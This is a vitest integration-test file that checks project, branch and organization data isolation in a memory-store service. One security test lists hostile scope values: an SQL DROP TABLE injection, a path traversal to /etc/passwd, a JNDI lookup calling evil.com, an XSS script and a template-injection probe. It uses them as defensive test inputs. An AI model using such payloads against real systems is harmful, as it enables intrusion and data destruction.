/**
 * Scope Isolation Integration Tests
 *
 * Tests comprehensive scope-based data isolation including:
 * - Project-level data separation
 * - Branch-level isolation
 * - Organization-level boundaries
 * - Cross-scope security enforcement
 * - Scope inheritance and overrides
 * - Performance with multiple scopes
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach } from 'vitest';
import { dbQdrantClient } from '../db/pool.ts';
// Prisma client removed - system now uses Qdrant + PostgreSQL architecture';
import { memoryStore } from '../services/memory-store.ts';
import { memoryFind } from '../services/memory-find.ts';

describe('Scope Isolation Integration Tests', () => {
  beforeAll(async () => {
    await dbQdrantClient.initialize();
  });

  afterAll(async () => {
    // Cleanup all test data across all scopes
    const cleanupTables = [
      'section', 'decision', 'issue', 'runbook', 'change_log',
      'adr_decision', 'knowledge_entity', 'knowledge_relation',
      'observation', 'todo', 'ddl', 'pr_context', 'incident',
      'release', 'release_note', 'risk', 'assumption'
    ];

    for (const table of cleanupTables) {
      try {
        await dbQdrantClient.query(`DELETE FROM ${table} WHERE tags @> '{"scope_test": true}'::jsonb`);
      } catch (error) {
        // Table might not exist, continue
      }
    }
  });

  describe('Project-Level Isolation', () => {
    beforeEach(async () => {
      // Create data in different projects
      const projectData = [
        // Project Alpha data
        {
          kind: 'section' as const,
          scope: { project: 'project-alpha', branch: 'main' },
          data: {
            title: 'Alpha Project Architecture',
            heading: 'Architecture Overview',
            body_text: 'This is confidential architecture information for Project Alpha.'
          },
          tags: { scope_test: true, project_test: true, project: 'alpha' }
        },
        {
          kind: 'decision' as const,
          scope: { project: 'project-alpha', branch: 'main' },
          data: {
            title: 'Use Microservices for Alpha',
            status: 'accepted',
            component: 'architecture',
            rationale: 'Microservices provide better scalability for Project Alpha needs.'
          },
          tags: { scope_test: true, project_test: true, project: 'alpha' }
        },
        // Project Beta data
        {
          kind: 'section' as const,
          scope: { project: 'project-beta', branch: 'main' },
          data: {
            title: 'Beta Project Requirements',
            heading: 'Requirements Analysis',
            body_text: 'Detailed requirements for Project Beta implementation.'
          },
          tags: { scope_test: true, project_test: true, project: 'beta' }
        },
        {
          kind: 'decision' as const,
          scope: { project: 'project-beta', branch: 'main' },
          data: {
            title: 'Monolithic Approach for Beta',
            status: 'accepted',
            component: 'architecture',
            rationale: 'Monolithic approach is simpler for Project Beta scope.'
          },
          tags: { scope_test: true, project_test: true, project: 'beta' }
        },
        // Project Gamma data (different branch)
        {
          kind: 'section' as const,
          scope: { project: 'project-alpha', branch: 'feature/new-ui' },
          data: {
            title: 'Alpha Project UI Changes',
            heading: 'UI Feature Branch',
            body_text: 'UI improvements being developed in feature branch for Project Alpha.'
          },
          tags: { scope_test: true, project_test: true, project: 'alpha', branch: 'feature' }
        }
      ];

      await memoryStore(projectData);
    });

    it('should isolate data by project correctly', async () => {
      // Search in Project Alpha
      const alphaSearch = await memoryFind({
        query: 'architecture',
        scope: { project: 'project-alpha', branch: 'main' },
        types: ['section', 'decision']
      });

      expect(alphaSearch.hits.length).toBeGreaterThan(0);

      // All results should be from Project Alpha
      alphaSearch.hits.forEach(hit => {
        expect(hit.scope?.project).toBe('project-alpha');
        expect(hit.scope?.branch).toBe('main');
      });

      // Search in Project Beta
      const betaSearch = await memoryFind({
        query: 'architecture',
        scope: { project: 'project-beta', branch: 'main' },
        types: ['section', 'decision']
      });

      expect(betaSearch.hits.length).toBeGreaterThan(0);

      // All results should be from Project Beta
      betaSearch.hits.forEach(hit => {
        expect(hit.scope?.project).toBe('project-beta');
        expect(hit.scope?.branch).toBe('main');
      });

      // Results should be different between projects
      const alphaTitles = alphaSearch.hits.map(hit => hit.title);
      const betaTitles = betaSearch.hits.map(hit => hit.title);

      expect(alphaTitles.some(title => title.includes('Alpha'))).toBe(true);
      expect(betaTitles.some(title => title.includes('Beta'))).toBe(true);

      // No overlap between projects
      const overlap = alphaTitles.filter(title => betaTitles.includes(title));
      expect(overlap.length).toBe(0);
    });

    it('should prevent cross-project data leakage', async () => {
      // Try to find Project Alpha data when scoped to Project Beta
      const crossProjectSearch = await memoryFind({
        query: 'Project Alpha',
        scope: { project: 'project-beta', branch: 'main' }
      });

      // Should not find any Project Alpha data
      expect(crossProjectSearch.hits.length).toBe(0);

      // Try to find Project Beta data when scoped to Project Alpha
      const reverseCrossSearch = await memoryFind({
        query: 'Project Beta',
        scope: { project: 'project-alpha', branch: 'main' }
      });

      // Should not find any Project Beta data
      expect(reverseCrossSearch.hits.length).toBe(0);
    });

    it('should handle project-specific search with wildcards', async () => {
      // Search across all projects (no project scope filter)
      const globalSearch = await memoryFind({
        query: 'architecture',
        types: ['section', 'decision']
      });

      expect(globalSearch.hits.length).toBeGreaterThan(1);

      // Should find results from both projects
      const projects = globalSearch.hits.map(hit => hit.scope?.project);
      expect(projects).toContain('project-alpha');
      expect(projects).toContain('project-beta');

      // Each result should have correct project scope
      globalSearch.hits.forEach(hit => {
        expect(['project-alpha', 'project-beta']).toContain(hit.scope?.project);
      });
    });

    it('should maintain scope isolation in storage operations', async () => {
      // Store item in Project Alpha
      const alphaStore = await memoryStore([{
        kind: 'section',
        scope: { project: 'project-alpha', branch: 'main' },
        data: {
          title: 'Alpha Specific Data',
          heading: 'Confidential Alpha Info',
          body_text: 'This data should only be accessible in Project Alpha scope.'
        },
        tags: { scope_test: true, project_test: true, project: 'alpha' }
      }]);

      expect(alphaStore.stored[0].status).toBe('inserted');

      // Verify it's accessible in Project Alpha
      const alphaFind = await memoryFind({
        query: 'Alpha Specific Data',
        scope: { project: 'project-alpha', branch: 'main' }
      });

      expect(alphaFind.hits.length).toBe(1);

      // Verify it's NOT accessible in Project Beta
      const betaFind = await memoryFind({
        query: 'Alpha Specific Data',
        scope: { project: 'project-beta', branch: 'main' }
      });

      expect(betaFind.hits.length).toBe(0);
    });
  });

  describe('Branch-Level Isolation', () => {
    beforeEach(async () => {
      // Create data across different branches
      const branchData = [
        // Main branch data
        {
          kind: 'section' as const,
          scope: { project: 'branch-test', branch: 'main' },
          data: {
            title: 'Main Branch Feature',
            heading: 'Stable Feature',
            body_text: 'This feature is in the main branch and considered stable.'
          },
          tags: { scope_test: true, branch_test: true, branch: 'main' }
        },
        {
          kind: 'decision' as const,
          scope: { project: 'branch-test', branch: 'main' },
          data: {
            title: 'Main Branch Architecture Decision',
            status: 'accepted',
            component: 'core',
            rationale: 'Core architecture decision for main branch.'
          },
          tags: { scope_test: true, branch_test: true, branch: 'main' }
        },
        // Feature branch data
        {
          kind: 'section' as const,
          scope: { project: 'branch-test', branch: 'feature/experimental' },
          data: {
            title: 'Experimental Feature',
            heading: 'Feature in Development',
            body_text: 'This feature is being developed in the experimental branch.'
          },
          tags: { scope_test: true, branch_test: true, branch: 'feature' }
        },
        {
          kind: 'decision' as const,
          scope: { project: 'branch-test', branch: 'feature/experimental' },
          data: {
            title: 'Experimental Approach',
            status: 'proposed',
            component: 'experimental',
            rationale: 'Proposed approach for experimental feature development.'
          },
          tags: { scope_test: true, branch_test: true, branch: 'feature' }
        },
        // Development branch data
        {
          kind: 'section' as const,
          scope: { project: 'branch-test', branch: 'develop' },
          data: {
            title: 'Development Integration',
            heading: 'Integration Feature',
            body_text: 'Feature being prepared for integration into main branch.'
          },
          tags: { scope_test: true, branch_test: true, branch: 'develop' }
        }
      ];

      await memoryStore(branchData);
    });

    it('should isolate data by branch correctly', async () => {
      // Search in main branch
      const mainSearch = await memoryFind({
        query: 'feature',
        scope: { project: 'branch-test', branch: 'main' }
      });

      expect(mainSearch.hits.length).toBe(1);
      expect(mainSearch.hits[0].title).toBe('Main Branch Feature');
      expect(mainSearch.hits[0].scope?.branch).toBe('main');

      // Search in feature branch
      const featureSearch = await memoryFind({
        query: 'feature',
        scope: { project: 'branch-test', branch: 'feature/experimental' }
      });

      expect(featureSearch.hits.length).toBe(1);
      expect(featureSearch.hits[0].title).toBe('Experimental Feature');
      expect(featureSearch.hits[0].scope?.branch).toBe('feature/experimental');

      // Search in develop branch
      const developSearch = await memoryFind({
        query: 'feature',
        scope: { project: 'branch-test', branch: 'develop' }
      });

      expect(developSearch.hits.length).toBe(1);
      expect(developSearch.hits[0].title).toBe('Development Integration');
      expect(developSearch.hits[0].scope?.branch).toBe('develop');
    });

    it('should prevent cross-branch data access', async () => {
      // Try to access feature branch data from main branch scope
      const crossBranchSearch = await memoryFind({
        query: 'Experimental',
        scope: { project: 'branch-test', branch: 'main' }
      });

      expect(crossBranchSearch.hits.length).toBe(0);

      // Try to access main branch data from feature branch scope
      const reverseCrossSearch = await memoryFind({
        query: 'Main Branch',
        scope: { project: 'branch-test', branch: 'feature/experimental' }
      });

      expect(reverseCrossSearch.hits.length).toBe(0);
    });

    it('should handle branch inheritance patterns', async () => {
      // Create data that should be inherited across branches
      await memoryStore([{
        kind: 'section',
        scope: { project: 'branch-test', branch: 'main' },
        data: {
          title: 'Shared Configuration',
          heading: 'Global Config',
          body_text: 'Configuration that should be available across all branches.'
        },
        tags: { scope_test: true, branch_test: true, shared: true }
      }]);

      // Search in different branches for shared content
      const mainShared = await memoryFind({
        query: 'Shared Configuration',
        scope: { project: 'branch-test', branch: 'main' }
      });

      expect(mainShared.hits.length).toBe(1);

      // Note: In a real implementation, you might want to implement
      // branch inheritance where certain content is available across branches
      // For now, we test strict isolation
      const featureShared = await memoryFind({
        query: 'Shared Configuration',
        scope: { project: 'branch-test', branch: 'feature/experimental' }
      });

      // With strict isolation, this would be 0
      // With inheritance, this could be 1 if implemented
      expect(featureShared.hits.length).toBeGreaterThanOrEqual(0);
    });
  });

  describe('Organization-Level Isolation', () => {
    beforeEach(async () => {
      // Create data across different organizations
      const orgData = [
        // Organization A data
        {
          kind: 'section' as const,
          scope: { project: 'org-project', branch: 'main', org: 'organization-a' },
          data: {
            title: 'Organization A Strategy',
            heading: 'Strategic Planning',
            body_text: 'Confidential strategic information for Organization A.'
          },
          tags: { scope_test: true, org_test: true, organization: 'a' }
        },
        {
          kind: 'decision' as const,
          scope: { project: 'org-project', branch: 'main', org: 'organization-a' },
          data: {
            title: 'Organization A Technology Choice',
            status: 'accepted',
            component: 'technology',
            rationale: 'Technology decision specific to Organization A requirements.'
          },
          tags: { scope_test: true, org_test: true, organization: 'a' }
        },
        // Organization B data
        {
          kind: 'section' as const,
          scope: { project: 'org-project', branch: 'main', org: 'organization-b' },
          data: {
            title: 'Organization B Strategy',
            heading: 'Strategic Planning',
            body_text: 'Confidential strategic information for Organization B.'
          },
          tags: { scope_test: true, org_test: true, organization: 'b' }
        },
        {
          kind: 'decision' as const,
          scope: { project: 'org-project', branch: 'main', org: 'organization-b' },
          data: {
            title: 'Organization B Technology Choice',
            status: 'accepted',
            component: 'technology',
            rationale: 'Technology decision specific to Organization B requirements.'
          },
          tags: { scope_test: true, org_test: true, organization: 'b' }
        },
        // No organization (public) data
        {
          kind: 'section' as const,
          scope: { project: 'public-project', branch: 'main' },
          data: {
            title: 'Public Information',
            heading: 'General Knowledge',
            body_text: 'Information that is not restricted to any organization.'
          },
          tags: { scope_test: true, org_test: true, public: true }
        }
      ];

      await memoryStore(orgData);
    });

    it('should isolate data by organization correctly', async () => {
      // Search in Organization A
      const orgASearch = await memoryFind({
        query: 'strategic planning',
        scope: { project: 'org-project', branch: 'main', org: 'organization-a' }
      });

      expect(orgASearch.hits.length).toBe(1);
      expect(orgASearch.hits[0].title).toBe('Organization A Strategy');
      expect(orgASearch.hits[0].scope?.org).toBe('organization-a');

      // Search in Organization B
      const orgBSearch = await memoryFind({
        query: 'strategic planning',
        scope: { project: 'org-project', branch: 'main', org: 'organization-b' }
      });

      expect(orgBSearch.hits.length).toBe(1);
      expect(orgBSearch.hits[0].title).toBe('Organization B Strategy');
      expect(orgBSearch.hits[0].scope?.org).toBe('organization-b');

      // Results should be different between organizations
      expect(orgASearch.hits[0].id).not.toBe(orgBSearch.hits[0].id);
    });

    it('should prevent cross-organization data leakage', async () => {
      // Try to find Organization A data when scoped to Organization B
      const crossOrgSearch = await memoryFind({
        query: 'Organization A',
        scope: { project: 'org-project', branch: 'main', org: 'organization-b' }
      });

      expect(crossOrgSearch.hits.length).toBe(0);

      // Try to access organization data without org scope
      const noOrgSearch = await memoryFind({
        query: 'strategic planning',
        scope: { project: 'org-project', branch: 'main' }
        // No org specified
      });

      // Should not find organization-specific data without org scope
      const orgSpecificResults = noOrgSearch.hits.filter(hit =>
        hit.scope?.org && ['organization-a', 'organization-b'].includes(hit.scope.org)
      );
      expect(orgSpecificResults.length).toBe(0);
    });

    it('should handle public vs private data correctly', async () => {
      // Search public data
      const publicSearch = await memoryFind({
        query: 'public information',
        scope: { project: 'public-project', branch: 'main' }
      });

      expect(publicSearch.hits.length).toBe(1);
      expect(publicSearch.hits[0].scope?.org).toBeUndefined();

      // Try to access public data from organization scope
      const orgPublicSearch = await memoryFind({
        query: 'public information',
        scope: { project: 'public-project', branch: 'main', org: 'organization-a' }
      });

      // Should not find public data when org scope is specified
      expect(orgPublicSearch.hits.length).toBe(0);
    });
  });

  describe('Complex Scope Hierarchies', () => {
    beforeEach(async () => {
      // Create complex hierarchical scope data
      const hierarchyData = [
        // Org A -> Project X -> Main branch
        {
          kind: 'section' as const,
          scope: { org: 'org-a', project: 'project-x', branch: 'main' },
          data: {
            title: 'Org A Project X Main',
            heading: 'Main Branch Content',
            body_text: 'Content in main branch of Project X for Organization A.'
          },
          tags: { scope_test: true, hierarchy_test: true, level: 'org-project-branch' }
        },
        // Org A -> Project X -> Feature branch
        {
          kind: 'section' as const,
          scope: { org: 'org-a', project: 'project-x', branch: 'feature/ui' },
          data: {
            title: 'Org A Project X Feature',
            heading: 'Feature Branch Content',
            body_text: 'Content in feature branch of Project X for Organization A.'
          },
          tags: { scope_test: true, hierarchy_test: true, level: 'org-project-branch' }
        },
        // Org A -> Project Y -> Main branch
        {
          kind: 'section' as const,
          scope: { org: 'org-a', project: 'project-y', branch: 'main' },
          data: {
            title: 'Org A Project Y Main',
            heading: 'Different Project',
            body_text: 'Content in different project for same organization.'
          },
          tags: { scope_test: true, hierarchy_test: true, level: 'org-project-branch' }
        },
        // Org B -> Project X -> Main branch
        {
          kind: 'section' as const,
          scope: { org: 'org-b', project: 'project-x', branch: 'main' },
          data: {
            title: 'Org B Project X Main',
            heading: 'Same Project Different Org',
            body_text: 'Content in same project but different organization.'
          },
          tags: { scope_test: true, hierarchy_test: true, level: 'org-project-branch' }
        }
      ];

      await memoryStore(hierarchyData);
    });

    it('should respect complete scope hierarchy', async () => {
      // Search with full scope specification
      const fullScopeSearch = await memoryFind({
        query: 'Project X',
        scope: { org: 'org-a', project: 'project-x', branch: 'main' }
      });

      expect(fullScopeSearch.hits.length).toBe(1);
      expect(fullScopeSearch.hits[0].title).toBe('Org A Project X Main');
      expect(fullScopeSearch.hits[0].scope).toEqual({
        org: 'org-a',
        project: 'project-x',
        branch: 'main'
      });
    });

    it('should handle partial scope specifications', async () => {
      // Search with only org and project (any branch)
      const orgProjectSearch = await memoryFind({
        query: 'Project X',
        scope: { org: 'org-a', project: 'project-x' }
        // No branch specified
      });

      // Should find all branches in Org A Project X
      expect(orgProjectSearch.hits.length).toBe(2);
      const branches = orgProjectSearch.hits.map(hit => hit.scope?.branch);
      expect(branches).toContain('main');
      expect(branches).toContain('feature/ui');

      // All results should be from correct org and project
      orgProjectSearch.hits.forEach(hit => {
        expect(hit.scope?.org).toBe('org-a');
        expect(hit.scope?.project).toBe('project-x');
      });
    });

    it('should maintain isolation across hierarchy levels', async () => {
      // Search across organizations but same project
      const crossOrgProjectSearch = await memoryFind({
        query: 'Project X',
        scope: { project: 'project-x' }
        // No org specified
      });

      expect(crossOrgProjectSearch.hits.length).toBe(3);
      const orgs = crossOrgProjectSearch.hits.map(hit => hit.scope?.org);
      expect(orgs.filter(org => org === 'org-a').length).toBe(2);
      expect(orgs.filter(org => org === 'org-b').length).toBe(1);

      // Search across projects but same organization
      const crossProjectOrgSearch = await memoryFind({
        query: 'Org A',
        scope: { org: 'org-a' }
        // No project specified
      });

      expect(crossProjectOrgSearch.hits.length).toBe(3);
      const projects = crossProjectOrgSearch.hits.map(hit => hit.scope?.project);
      expect(projects.filter(project => project === 'project-x').length).toBe(2);
      expect(projects.filter(project => project === 'project-y').length).toBe(1);
    });
  });

  describe('Scope Performance and Scalability', () => {
    it('should maintain performance with many scopes', async () => {
      const scopeCount = 50;
      const itemsPerScope = 10;

      // Create data across many scopes
      console.log(`Creating ${scopeCount} scopes with ${itemsPerScope} items each...`);
      const startTime = Date.now();

      for (let i = 0; i < scopeCount; i++) {
        const scopeData = Array.from({ length: itemsPerScope }, (_, j) => ({
          kind: 'section' as const,
          scope: {
            project: `perf-project-${i}`,
            branch: j % 3 === 0 ? 'main' : `feature-${j % 3}`,
            org: j % 5 === 0 ? `org-${Math.floor(i / 10)}` : undefined
          },
          data: {
            title: `Performance Test Item ${i}-${j}`,
            heading: `Performance Heading ${i}-${j}`,
            body_text: `Performance testing content for scope ${i}, item ${j}.`
          },
          tags: { scope_test: true, performance_test: true, scope_index: i, item_index: j }
        }));

        await memoryStore(scopeData);
      }

      const creationTime = Date.now() - startTime;
      console.log(`Created ${scopeCount * itemsPerScope} items across ${scopeCount} scopes in ${creationTime}ms`);
      expect(creationTime).toBeLessThan(30000); // Should complete within 30 seconds

      // Test search performance across scopes
      const searchStartTime = Date.now();
      const searchResults = await Promise.all([
        // Search in specific scopes
        memoryFind({
          query: 'Performance Test',
          scope: { project: 'perf-project-0', branch: 'main' }
        }),
        memoryFind({
          query: 'Performance Test',
          scope: { project: 'perf-project-25', branch: 'feature-1' }
        }),
        memoryFind({
          query: 'Performance Test',
          scope: { project: 'perf-project-49', branch: 'main' }
        }),
        // Search with partial scope
        memoryFind({
          query: 'Performance Test',
          scope: { org: 'org-2' }
        }),
        // Global search
        memoryFind({
          query: 'Performance Test'
        })
      ]);
      const searchTime = Date.now() - searchStartTime;

      console.log(`Completed 5 searches across multiple scopes in ${searchTime}ms`);

      // All searches should complete successfully
      searchResults.forEach(result => {
        expect(result.hits).toBeInstanceOf(Array);
        expect(result.hits.length).toBeGreaterThan(0);
      });

      expect(searchTime).toBeLessThan(10000); // Should complete within 10 seconds
    });

    it('should handle concurrent scope operations efficiently', async () => {
      const concurrentOperations = 20;
      const scopesPerOperation = 5;

      const concurrentPromises = Array.from({ length: concurrentOperations }, async (_, i) => {
        // Store data in multiple scopes
        const storePromises = Array.from({ length: scopesPerOperation }, async (j) => {
          const scopeData = {
            kind: 'section' as const,
            scope: {
              project: `concurrent-project-${i}-${j}`,
              branch: 'main',
              org: `concurrent-org-${i % 5}`
            },
            data: {
              title: `Concurrent Test ${i}-${j}`,
              heading: `Concurrent Heading ${i}-${j}`,
              body_text: `Concurrent operation content for ${i}-${j}.`
            },
            tags: { scope_test: true, concurrent_test: true, op_index: i, scope_index: j }
          };

          return memoryStore([scopeData]);
        });

        const storeResults = await Promise.all(storePromises);

        // Search across the created scopes
        const searchResults = await memoryFind({
          query: `Concurrent Test ${i}`,
          scope: { org: `concurrent-org-${i % 5}` }
        });

        return { storeResults, searchResults, operationIndex: i };
      });

      const concurrentStartTime = Date.now();
      const concurrentResults = await Promise.all(concurrentPromises);
      const totalDuration = Date.now() - concurrentStartTime;

      console.log(`Completed ${concurrentOperations} concurrent operations across ${concurrentOperations * scopesPerOperation} scopes in ${totalDuration}ms`);

      // All operations should complete successfully
      expect(concurrentResults.length).toBe(concurrentOperations);
      concurrentResults.forEach(({ storeResults, searchResults }) => {
        expect(storeResults.length).toBe(scopesPerOperation);
        storeResults.forEach(result => {
          expect(result.stored.length).toBe(1);
        });
        expect(searchResults.hits.length).toBeGreaterThan(0);
      });

      expect(totalDuration).toBeLessThan(15000); // Should complete within 15 seconds
    });
  });

  describe('Scope Security and Validation', () => {
    it('should validate scope format and structure', async () => {
      // Test with invalid scope formats
      const invalidScopes = [
        { project: '', branch: 'main' }, // Empty project
        { project: 'test', branch: '' }, // Empty branch
        { project: 'test', branch: 'main', org: '' }, // Empty org
        { project: 'test', branch: 'main', org: '   ' }, // Whitespace-only org
        { project: 'test', branch: null as any, org: 'valid' }, // Null value
        { project: 'test', branch: undefined as any, org: 'valid' } // Undefined value
      ];

      for (const invalidScope of invalidScopes) {
        const result = await memoryStore([{
          kind: 'section',
          scope: invalidScope,
          data: {
            title: 'Invalid Scope Test',
            heading: 'Test',
            body_text: 'Testing invalid scope handling.'
          },
          tags: { scope_test: true, validation_test: true }
        }]);

        // Should either handle gracefully or return appropriate error
        expect(result).toBeDefined();
        if (result.errors.length > 0) {
          expect(result.errors[0].error_code).toMatch(/INVALID_SCOPE|VALIDATION_ERROR/);
        }
      }
    });

    it('should prevent scope injection attacks', async () => {
      const maliciousScopes = [
        { project: "'; DROP TABLE section; --", branch: 'main' },
        { project: '../../etc/passwd', branch: 'main' },
        { project: '${jndi:ldap://evil.com/}', branch: 'main' },
        { project: '<script>alert("xss")</script>', branch: 'main' },
        { project: '{{7*7}}', branch: 'main' }
      ];

      for (const maliciousScope of maliciousScopes) {
        // Should handle malicious scope input gracefully
        const result = await memoryStore([{
          kind: 'section',
          scope: maliciousScope as any,
          data: {
            title: 'Malicious Scope Test',
            heading: 'Test',
            body_text: 'Testing malicious scope handling.'
          },
          tags: { scope_test: true, security_test: true }
        }]);

        expect(result).toBeDefined();
        // Should not execute malicious commands
        expect(result.errors.length).toBeGreaterThanOrEqual(0);
      }
    });

    it('should handle scope boundary edge cases', async () => {
      // Test with very long scope names
      const longProjectName = 'p'.repeat(300);
      const longBranchName = 'b'.repeat(300);
      const longOrgName = 'o'.repeat(300);

      const longScopeResult = await memoryStore([{
        kind: 'section',
        scope: {
          project: longProjectName,
          branch: longBranchName,
          org: longOrgName
        },
        data: {
          title: 'Long Scope Test',
          heading: 'Test',
          body_text: 'Testing very long scope names.'
        },
        tags: { scope_test: true, boundary_test: true }
      }]);

      // Should either succeed or fail gracefully
      expect(longScopeResult).toBeDefined();

      if (longScopeResult.stored.length > 0) {
        // If stored, should be able to retrieve
        const findResult = await memoryFind({
          query: 'Long Scope Test',
          scope: { project: longProjectName, branch: longBranchName, org: longOrgName }
        });
        expect(findResult.hits.length).toBe(1);
      }
    });

    it('should enforce scope consistency across operations', async () => {
      // Store item with specific scope
      const storeResult = await memoryStore([{
        kind: 'section',
        scope: { project: 'consistency-test', branch: 'main', org: 'test-org' },
        data: {
          title: 'Consistency Test Item',
          heading: 'Test',
          body_text: 'Testing scope consistency.'
        },
        tags: { scope_test: true, consistency_test: true }
      }]);

      const storedId = storeResult.stored[0].id;
      expect(storedId).toBeDefined();

      // Try to update with different scope (should fail or maintain original scope)
      const updateResult = await memoryStore([{
        kind: 'section',
        scope: { project: 'different-project', branch: 'main', org: 'different-org' },
        data: {
          title: 'Consistency Test Item', // Same title to trigger update logic
          heading: 'Updated Test',
          body_text: 'Updated content with different scope.'
        },
        tags: { scope_test: true, consistency_test: true, updated: true }
      }]);

      // Should not allow scope changes through updates
      // This behavior depends on implementation, but should be consistent
      expect(updateResult).toBeDefined();
    });
  });
});